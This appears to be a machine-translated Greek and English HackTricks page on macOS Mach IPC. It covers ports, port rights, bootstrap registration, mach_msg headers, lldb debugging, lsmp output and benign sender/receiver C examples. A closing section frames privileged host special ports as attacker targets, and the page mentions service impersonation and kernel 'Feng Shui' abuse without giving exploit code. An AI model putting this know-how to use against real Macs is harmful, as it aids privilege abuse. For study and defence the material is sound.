# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach χρησιμοποιεί **tasks** ως την **μικρότερη μονάδα** για την κοινή χρήση πόρων, και κάθε task μπορεί να περιέχει **πολλαπλά threads**. Αυτά τα **tasks και threads αντιστοιχίζονται 1:1 σε POSIX processes και threads**.

Η επικοινωνία μεταξύ tasks γίνεται μέσω Mach Inter-Process Communication (IPC), χρησιμοποιώντας κανάλια μονοδιάστατης επικοινωνίας. **Τα μηνύματα μεταφέρονται μεταξύ ports**, τα οποία λειτουργούν ως είδος **οι σειρές μηνυμάτων** που διαχειρίζεται ο kernel.

Ένα **port** είναι το **βασικό** στοιχείο του Mach IPC. Μπορεί να χρησιμοποιηθεί για **αποστολή μηνυμάτων και για λήψη** αυτών.

Κάθε process έχει έναν **IPC πίνακα**, μέσα στον οποίο είναι δυνατό να βρεθούν τα **mach ports του process**. Το όνομα ενός mach port είναι στην πραγματικότητα ένας αριθμός (ένας pointer στο kernel αντικείμενο).

Ένα process μπορεί επίσης να στείλει ένα όνομα port με κάποια δικαιώματα **σε ένα διαφορετικό task** και ο kernel θα κάνει αυτή την εγγραφή στον **IPC πίνακα του άλλου task** να εμφανιστεί.

### Port Rights

Τα port rights, που ορίζουν ποιες λειτουργίες μπορεί να εκτελεί ένα task, είναι κρίσιμα για αυτή την επικοινωνία. Τα πιθανά **port rights** είναι ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Receive right**, που επιτρέπει τη λήψη μηνυμάτων που στέλνονται στο port. Mach ports είναι MPSC (multiple-producer, single-consumer) queues, που σημαίνει ότι μπορεί να υπάρχει **μόνο ένα receive right για κάθε port** σε όλο το σύστημα (σε αντίθεση με τα pipes, όπου πολλαπλά processes μπορούν να κρατούν file descriptors για την πλευρά ανάγνωσης ενός pipe).
- A **task with the Receive** right μπορεί να λαμβάνει μηνύματα και να **δημιουργεί Send rights**, επιτρέποντάς του να στέλνει μηνύματα. Αρχικά μόνο το **ίδιο το task έχει Receive right πάνω στο port** του.
- Αν ο κάτοχος του Receive right **πεθάνει** ή το ακυρώσει, το **send right γίνεται άχρηστο (dead name).**
- **Send right**, που επιτρέπει την αποστολή μηνυμάτων προς το port.
- Το Send right μπορεί να **κλωνοποιηθεί** έτσι ώστε ένα task που κατέχει ένα Send right να κλωνοποιήσει το δικαίωμα και να **το παραχωρήσει σε τρίτο task**.
- Σημειώστε ότι τα **port rights** μπορούν επίσης να **περαστούν** μέσω Mac μηνυμάτων.
- **Send-once right**, που επιτρέπει την αποστολή ενός μηνύματος προς το port και μετά εξαφανίζεται.
- Αυτό το right **δεν μπορεί** να **κλωνοποιηθεί**, αλλά μπορεί να **μετακινηθεί**.
- **Port set right**, που δηλώνει ένα _port set_ αντί για ένα μεμονωμένο port. Η αποδιαλογή ενός μηνύματος από ένα port set αποδιατάσσει ένα μήνυμα από ένα από τα ports που περιέχει. Τα port sets μπορούν να χρησιμοποιηθούν για να ακούν πολλά ports ταυτόχρονα, παρόμοια με `select`/`poll`/`epoll`/`kqueue` στο Unix.
- **Dead name**, που δεν είναι πραγματικό port right, αλλά απλώς ένα placeholder. Όταν ένα port καταστρέφεται, όλα τα υπάρχοντα port rights προς το port μετατρέπονται σε dead names.

**Tasks μπορούν να μεταφέρουν SEND rights σε άλλους**, επιτρέποντάς τους να στέλνουν απαντήσεις. **SEND rights μπορούν επίσης να κλωνοποιηθούν, ώστε ένα task να διπλασιάσει και να δώσει το δικαίωμα σε ένα τρίτο task**. Αυτό, σε συνδυασμό με μια μεσολαβητική διεργασία γνωστή ως **bootstrap server**, επιτρέπει αποτελεσματική επικοινωνία μεταξύ tasks.

### File Ports

File ports επιτρέπουν την περιτύλιξη file descriptors σε Mac ports (χρησιμοποιώντας Mach port rights). Είναι δυνατό να δημιουργηθεί ένα `fileport` από ένα δεδομένο FD χρησιμοποιώντας `fileport_makeport` και να δημιουργηθεί ένα FD από ένα fileport χρησιμοποιώντας `fileport_makefd`.

### Establishing a communication

Όπως αναφέρθηκε προηγούμενα, είναι δυνατό να σταλούν rights χρησιμοποιώντας Mach messages, ωστόσο, **δεν μπορείτε να στείλετε ένα right χωρίς να έχετε ήδη ένα right** για να στείλετε ένα Mach μήνυμα. Τότε, πώς θεμελιώνεται η πρώτη επικοινωνία;

Για αυτό, ο **bootstrap server** (**launchd** στο mac) εμπλέκεται, καθώς **ο οποιοσδήποτε μπορεί να πάρει ένα SEND right προς τον bootstrap server**, και είναι δυνατή η αίτηση προς αυτόν για ένα right ώστε να στείλει μήνυμα σε άλλη διεργασία:

1. Task **A** δημιουργεί ένα **νέο port**, λαμβάνοντας το **RECEIVE right** πάνω του.
2. Task **A**, ως κάτοχος του RECEIVE right, **παράγει ένα SEND right για το port**.
3. Task **A** δημιουργεί μια **σύνδεση** με τον **bootstrap server**, και **του στέλνει το SEND right** για το port που δημιούργησε στην αρχή.
- Θυμηθείτε ότι οποιοσδήποτε μπορεί να πάρει ένα SEND right στο bootstrap server.
4. Task A στέλνει ένα `bootstrap_register` μήνυμα στον bootstrap server για να **συνδέσει το δεδομένο port με ένα όνομα** όπως `com.apple.taska`
5. Task **B** αλληλεπιδρά με τον **bootstrap server** για να εκτελέσει ένα bootstrap **lookup για την υπηρεσία** ( `bootstrap_lookup`). Για να μπορέσει ο bootstrap server να απαντήσει, το task B θα του στείλει ένα **SEND right σε ένα port που είχε προηγουμένως δημιουργήσει** μέσα στο lookup μήνυμα. Αν το lookup είναι επιτυχές, ο **server διπλασιάζει το SEND right** που έλαβε από το Task A και **το μεταβιβάζει στο Task B**.
- Θυμηθείτε ότι οποιοσδήποτε μπορεί να πάρει ένα SEND right στο bootstrap server.
6. Με αυτό το SEND right, **Task B** είναι ικανό να **στείλει** ένα **μήνυμα** **προς Task A**.
7. Για αμφίδρομη επικοινωνία συνήθως το task **B** δημιουργεί ένα νέο port με ένα **RECEIVE** right και ένα **SEND** right, και δίνει το **SEND right στο Task A** ώστε να μπορεί να στέλνει μηνύματα στο TASK B (αμφίδρομη επικοινωνία).

Ο bootstrap server **δεν μπορεί να αυθεντικοποιήσει** το όνομα της υπηρεσίας που ισχυρίζεται ένα task. Αυτό σημαίνει ότι ένα **task** θα μπορούσε δυνητικά να **παριστάνει οποιοδήποτε system task**, όπως να ισχυρίζεται ψευδώς ένα όνομα authorization υπηρεσίας και στη συνέχεια να εγκρίνει κάθε αίτημα.

Στη συνέχεια, η Apple αποθηκεύει τα **ονόματα των system-provided services** σε ασφαλή αρχεία ρυθμίσεων, που βρίσκονται σε καταλόγους προστατευμένους από **SIP**: `/System/Library/LaunchDaemons` και `/System/Library/LaunchAgents`. Μαζί με κάθε όνομα υπηρεσίας, το **συνοδευτικό δυαδικό αρχείο επίσης αποθηκεύεται**. Ο bootstrap server θα δημιουργήσει και θα κρατήσει ένα **RECEIVE right για κάθε ένα από αυτά τα ονόματα υπηρεσίας**.

Για αυτές τις προ-ορισμένες υπηρεσίες, η **διαδικασία lookup διαφέρει ελαφρώς**. Όταν αναζητείται ένα όνομα υπηρεσίας, το launchd ξεκινά την υπηρεσία δυναμικά. Η νέα ροή εργασίας είναι η εξής:

- Task **B** ξεκινά ένα bootstrap **lookup** για ένα όνομα υπηρεσίας.
- Το **launchd** ελέγχει αν το task τρέχει και αν όχι, **το ξεκινά**.
- Task **A** (η υπηρεσία) εκτελεί ένα **bootstrap check-in** (`bootstrap_check_in()`). Εδώ, ο **bootstrap** server δημιουργεί ένα SEND right, το διατηρεί, και **μεταβιβάζει το RECEIVE right στο Task A**.
- Το launchd διπλασιάζει το **SEND right και το στέλνει στο Task B**.
- Task **B** δημιουργεί ένα νέο port με ένα **RECEIVE** right και ένα **SEND** right, και δίνει το **SEND right στο Task A** (την svc) ώστε να μπορεί να στέλνει μηνύματα στο TASK B (αμφίδρομη επικοινωνία).

Ωστόσο, αυτή η διαδικασία εφαρμόζεται μόνο σε προεπιλεγμένα system tasks. Μη-system tasks εξακολουθούν να λειτουργούν όπως περιγράφηκε αρχικά, κάτι που θα μπορούσε δυνητικά να επιτρέψει την παριστάνωση.

> [!CAUTION]
> Επομένως, το launchd δεν πρέπει ποτέ να καταρρεύσει αλλιώς όλο το σύστημα θα καταρρεύσει.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Η συνάρτηση `mach_msg`, ουσιαστικά ένα system call, χρησιμοποιείται για την αποστολή και τη λήψη Mach μηνυμάτων. Η συνάρτηση απαιτεί το μήνυμα που πρόκειται να σταλεί ως πρώτο επιχείρημα. Αυτό το μήνυμα πρέπει να αρχίζει με μια δομή `mach_msg_header_t`, ακολουθούμενη από το πραγματικό περιεχόμενο του μηνύματος. Η δομή ορίζεται ως εξής:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.

The initial field **`msgh_bits`** is a bitmap:

- First bit (most significative) is used to indicate that a message is complex (more on this below)
- The 3rd and 4th are used by the kernel
- The **5 least significant bits of the 2nd byte** from can be used for **voucher**: another type of port to send key/value combinations.
- The **5 least significant bits of the 3rd byte** from can be used for **local port**
- The **5 least significant bits of the 4th byte** from can be used for **remote port**

The types that can be specified in the voucher, local and remote ports are (from [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Για παράδειγμα, `MACH_MSG_TYPE_MAKE_SEND_ONCE` μπορεί να χρησιμοποιηθεί για να υποδείξει ότι ένα **send-once** **right** πρέπει να εξαχθεί και να μεταβιβαστεί για αυτήν τη θύρα. Μπορεί επίσης να καθοριστεί `MACH_PORT_NULL` για να εμποδιστεί ο παραλήπτης να μπορεί να απαντήσει.

Για να επιτευχθεί εύκολη **αμφίδρομη επικοινωνία**, μια διεργασία μπορεί να καθορίσει μια **mach port** στο mach **message header** που ονομάζεται _reply port_ (**`msgh_local_port`**) όπου ο **παραλήπτης** του μηνύματος μπορεί να **στείλει μια απάντηση** σε αυτό το μήνυμα.

> [!TIP]
> Σημειώστε ότι αυτός ο τύπος αμφίδρομης επικοινωνίας χρησιμοποιείται σε XPC μηνύματα που αναμένουν απάντηση (`xpc_connection_send_message_with_reply` και `xpc_connection_send_message_with_reply_sync`). Αλλά **συνήθως δημιουργούνται διαφορετικές θύρες** όπως εξηγήθηκε προηγουμένως για να δημιουργηθεί η αμφίδρομη επικοινωνία.

Τα υπόλοιπα πεδία του message header είναι:

- `msgh_size`: το μέγεθος ολόκληρου του πακέτου.
- `msgh_remote_port`: η θύρα στην οποία αποστέλλεται αυτό το μήνυμα.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: το ID αυτού του μηνύματος, που ερμηνεύεται από τον παραλήπτη.

> [!CAUTION]
> Σημειώστε ότι **mach messages are sent over a `mach port`**, το οποίο είναι ένα κανάλι επικοινωνίας με **έναν μόνο δέκτη**, **πολλούς αποστολείς** ενσωματωμένο στον mach kernel. **Πολλαπλές διεργασίες** μπορούν να **στείλουν μηνύματα** σε μια mach port, αλλά σε οποιαδήποτε στιγμή μόνο **μία διεργασία μπορεί να διαβάσει** από αυτήν.

Τα μηνύματα σχηματίζονται από το **`mach_msg_header_t`** header ακολουθούμενο από το **body** και από το **trailer** (αν υπάρχει) και μπορεί να χορηγήσουν άδεια για απάντηση σε αυτό. Σε αυτές τις περιπτώσεις, ο kernel απλώς χρειάζεται να περάσει το μήνυμα από ένα task στο άλλο.

Ένα **trailer** είναι **πληροφορία που προστίθεται στο μήνυμα από τον kernel** (δεν μπορεί να οριστεί από τον χρήστη) η οποία μπορεί να ζητηθεί κατά τη λήψη μηνύματος με τις σημαίες `MACH_RCV_TRAILER_<trailer_opt>` (υπάρχει διαφορετική πληροφορία που μπορεί να ζητηθεί).

#### Σύνθετα Μηνύματα

Ωστόσο, υπάρχουν και άλλα πιο **σύνθετα** μηνύματα, όπως αυτά που περνούν επιπλέον δικαιώματα θύρας ή μοιράζουν μνήμη, όπου ο kernel πρέπει επίσης να στείλει αυτά τα αντικείμενα στον παραλήπτη. Σε αυτές τις περιπτώσεις τίθεται το πιο σημαντικό bit του header `msgh_bits`.

Οι δυνατοί περιγραφείς που μπορούν να περαστούν ορίζονται στο [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
Σε 32bits, όλοι οι descriptors είναι 12B και ο τύπος του descriptor βρίσκεται στο 11ο. Σε 64 bits, τα μεγέθη διαφέρουν.

> [!CAUTION]
> Ο kernel θα αντιγράψει τους descriptors από ένα task σε άλλο αλλά πρώτα **δημιουργώντας ένα αντίγραφο στη μνήμη του kernel**. Αυτή η τεχνική, γνωστή ως "Feng Shui", έχει κακοποιηθεί σε αρκετά exploits για να κάνει τον **kernel να αντιγράψει δεδομένα στη μνήμη του**, αναγκάζοντας μια διεργασία να στείλει descriptors στον εαυτό της. Έπειτα η διεργασία μπορεί να λάβει τα μηνύματα (ο kernel θα τα απελευθερώσει).
>
> Επίσης είναι δυνατό να **στείλετε port rights σε μια ευάλωτη διεργασία**, και τα port rights θα εμφανιστούν απλώς στη διεργασία (ακόμα κι αν δεν τα χειρίζεται).

### Mac Ports APIs

Σημειώστε ότι οι ports σχετίζονται με το task namespace, οπότε για να δημιουργήσετε ή να αναζητήσετε ένα port, ερωτάται επίσης το task namespace (περισσότερα στο `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Δημιουργούν** ένα port.
- `mach_port_allocate` μπορεί επίσης να δημιουργήσει ένα **port set**: receive right πάνω σε μια ομάδα ports. Όταν λαμβάνεται ένα μήνυμα, υποδεικνύεται το port από όπου προήλθε.
- `mach_port_allocate_name`: Αλλάζει το όνομα του port (από προεπιλογή 32bit integer)
- `mach_port_names`: Παίρνει τα ονόματα των ports από έναν στόχο
- `mach_port_type`: Παίρνει τα rights ενός task πάνω σε ένα όνομα
- `mach_port_rename`: Μετονομάζει ένα port (σαν dup2 για FDs)
- `mach_port_allocate`: Δεσμεύει ένα νέο RECEIVE, PORT_SET ή DEAD_NAME
- `mach_port_insert_right`: Δημιουργεί ένα νέο right σε ένα port όπου έχετε RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Συναρτήσεις που χρησιμοποιούνται για να **στείλουν και να λάβουν mach μηνύματα**. Η overwrite έκδοση επιτρέπει να καθορίσετε ένα διαφορετικό buffer για τη λήψη μηνυμάτων (η άλλη έκδοση απλώς θα το ξαναχρησιμοποιήσει).

### Debug mach_msg

Δεδομένου ότι οι συναρτήσεις **`mach_msg`** και **`mach_msg_overwrite`** είναι αυτές που χρησιμοποιούνται για την αποστολή και λήψη μηνυμάτων, η τοποθέτηση ενός breakpoint πάνω τους θα επιτρέψει την επιθεώρηση των αποστελλόμενων και των ληφθέντων μηνυμάτων.

Για παράδειγμα, ξεκινήστε την αποσφαλμάτωση οποιασδήποτε εφαρμογής μπορείτε, καθώς θα φορτώσει το **`libSystem.B` που θα χρησιμοποιήσει αυτή τη συνάρτηση**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Για να δείτε τις παραμέτρους της **`mach_msg`**, ελέγξτε τους καταχωρητές. Αυτές είναι οι παράμετροι (από το [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Λάβετε τις τιμές από τα μητρώα:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Επιθεωρήστε την κεφαλίδα του μηνύματος ελέγχοντας το πρώτο όρισμα:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Αυτός ο τύπος `mach_msg_bits_t` είναι πολύ συνηθισμένος ώστε να επιτρέπει μια απάντηση.

### Απαρίθμηση ports
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Το **όνομα** είναι το προεπιλεγμένο όνομα που δίνεται στο port (δείτε πώς **αυξάνεται** στα πρώτα 3 bytes). Το **`ipc-object`** είναι ο **θολωμένος** μοναδικός **αναγνωριστής** του port.\
Σημειώστε επίσης πώς τα ports με μόνο δικαίωμα **`send`** **ταυτοποιούν τον ιδιοκτήτη** τους (όνομα port + pid).\
Σημειώστε επίσης τη χρήση του **`+`** για να υποδείξει **άλλες διεργασίες συνδεδεμένες στο ίδιο port**.

Επίσης είναι δυνατό να χρησιμοποιηθεί [**procesxp**](https://www.newosxbook.com/tools/procexp.html) για να δείτε και τα **εγγεγραμμένα ονόματα υπηρεσιών** (με SIP απενεργοποιημένο λόγω της ανάγκης του `com.apple.system-task-port`):
```
procesp 1 ports
```
Μπορείτε να εγκαταστήσετε αυτό το εργαλείο σε iOS κατεβάζοντάς το από [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Παράδειγμα κώδικα

Παρατηρήστε πώς ο **sender** **allocates** μια θύρα, δημιουργεί ένα **send right** για το όνομα `org.darlinghq.example` και το στέλνει στον **bootstrap server**, ενώ ο **sender** ζήτησε το **send right** αυτού του ονόματος και το χρησιμοποίησε για να **send a message**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Προνομιούχες θύρες

Υπάρχουν μερικές ειδικές θύρες που επιτρέπουν να **εκτελούνται ορισμένες ευαίσθητες ενέργειες ή να αποκτάται πρόσβαση σε ευαίσθητα δεδομένα** σε περίπτωση που μια διεργασία έχει τα δικαιώματα **SEND** πάνω τους. Αυτό καθιστά αυτές τις θύρες πολύ ενδιαφέρουσες από την πλευρά ενός επιτιθέμενου όχι μόνο λόγω των δυνατοτήτων αλλά και επειδή είναι δυνατό να **μοιραστούν τα δικαιώματα SEND μεταξύ διεργασιών**.

### Host Special Ports

Αυτές οι θύρες αναπαριστώνται με αριθμό.

**SEND** δικαιώματα μπορούν να αποκτηθούν καλώντας **`host_get_special_port`** και **RECEIVE** δικαιώματα καλώντας **`host_set_special_port`**. Ωστόσο, και οι δύο κλήσεις απαιτούν την πόρτα **`host_priv`** στην οποία μόνο το root έχει πρόσβαση. Επιπλέον, παλαιότερα το root μπορούσε να καλέσει **`host_set_special_port`** και να καταλάβει αυθαίρετες θύρες, γεγονός που επέτρεπε, για παράδειγμα, την παράκαμψη των code signatures με την κατάληψη του `HOST_KEXTD_PORT` (το SIP το αποτρέπει πλέον).

Διαχωρίζονται σε 2 ομάδες: Οι **πρώτες 7 θύρες ανήκουν στον kernel**, συγκεκριμένα η 1 `HOST_PORT`, η 2 `HOST_PRIV_PORT`, η 3 `HOST_IO_MASTER_PORT` και η 7 είναι `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Οι αυτές που ξεκινούν **από** τον αριθμό **8** **ανήκουν σε system daemons** και μπορούν να βρεθούν δηλωμένες στο [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: Εάν μια διεργασία έχει προνόμιο **SEND** πάνω σε αυτή τη θύρα μπορεί να λάβει **πληροφορίες** για το **system** καλώντας ρουτίνες όπως:
  - `host_processor_info`: Λήψη πληροφοριών επεξεργαστή
  - `host_info`: Λήψη πληροφοριών host
  - `host_virtual_physical_table_info`: Virtual/Physical page table (requires MACH_VMDEBUG)
  - `host_statistics`: Λήψη στατιστικών host
  - `mach_memory_info`: Λήψη διάταξης μνήμης του kernel
- **Host Priv port**: Μια διεργασία με δικαίωμα **SEND** σε αυτή τη θύρα μπορεί να εκτελέσει **προνομιακές ενέργειες** όπως την εμφάνιση δεδομένων εκκίνησης ή την προσπάθεια φόρτωσης ενός kernel extension. Η **διεργασία πρέπει να είναι root** για να αποκτήσει αυτή την άδεια.
- Επιπλέον, για να κληθεί το API **`kext_request`** απαιτείται να έχει κανείς επιπλέον entitlements **`com.apple.private.kext*`** που δίνονται μόνο σε Apple binaries.
- Άλλες ρουτίνες που μπορούν να κληθούν είναι:
  - `host_get_boot_info`: Λήψη του `machine_boot_info()`
  - `host_priv_statistics`: Λήψη προνομιακών στατιστικών
  - `vm_allocate_cpm`: Allocate Contiguous Physical Memory
  - `host_processors`: Send right to host processors
  - `mach_vm_wire`: Make memory resident
- Καθώς το **root** μπορεί να έχει αυτή την άδεια, θα μπορούσε να καλέσει `host_set_[special/exception]_port[s]` για να **hijack host special or exception ports**.

